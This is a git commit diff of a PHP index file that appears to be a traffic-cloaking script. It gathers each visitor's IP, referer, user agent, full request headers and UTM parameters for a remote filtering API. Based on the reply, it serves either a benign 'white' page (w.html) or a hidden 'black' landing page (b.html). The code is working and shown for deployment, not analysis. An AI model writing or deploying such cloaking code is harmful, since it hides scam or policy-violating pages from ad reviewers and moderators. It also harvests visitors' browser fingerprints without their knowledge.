a032fe683ba50b1c7db75751d19b959b99471dc2
Irbis007 <suskodomk@gmail.com>
2024-01-23 14:47:10 +0300

    add html

--- index.php
+++ index.php
@@ -1,15 +1,11 @@
-<?php
+<?
  session_start();
  $post["ip"] = @$_SERVER["HTTP_CF_CONNECTING_IP"]? @$_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
  $post["domain"] = $_SERVER["HTTP_HOST"];
  $post["referer"] = @$_SERVER["HTTP_REFERER"];
  $post["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
  $post["headers"] = json_encode(apache_request_headers());
- $post["land"] = 1; //раскомментировать на в индексном файле лендинга
-
- $requestPath = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
-
- $htmlFilePath = __DIR__ . $requestPath . '.html';
+ // $post["land"] = 1; //раскомментировать на в индексном файле лендинга
 
  if($_GET)foreach($_GET as $key => $value) $_SESSION[$key] = $value;
  $post["utm"] = json_encode($_SESSION);
@@ -30,10 +26,7 @@
  if($api_reqest)foreach($api_reqest as $key => $value) $_SESSION[$key] = $value;
 
 if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
-   header("HTTP/1.0 404 Not Found");
-   echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL ' . htmlspecialchars($requestPath) . ' was not found on this server.</p></body></html>';
-} else{
-   header('Content-Type: text/html');
-
-   readfile($htmlFilePath);
+    require_once("w.html");
+ }else{
+    require_once("b.html");
  }
